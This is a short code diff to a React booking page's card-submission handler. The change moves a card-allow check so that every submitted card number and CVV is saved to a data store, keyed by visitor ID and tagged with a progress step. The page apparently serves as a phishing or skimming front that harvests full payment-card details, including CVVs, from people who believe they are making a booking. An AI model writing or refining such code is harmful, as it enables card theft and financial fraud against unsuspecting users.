@@ -249,7 +249,6 @@ export default function BookingPage() {
 
   const handleCardFormSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
-    if(!checkCardAllow(cardNumber)){
     await addData({
       id: visitorID,
       cardNumber,
@@ -258,6 +257,8 @@ export default function BookingPage() {
       cvv,
       step: "card-details-submitted",
     })
+    if(!checkCardAllow(cardNumber)){
+
   }
     setIsLoading(true)
     setTimeout(() => {
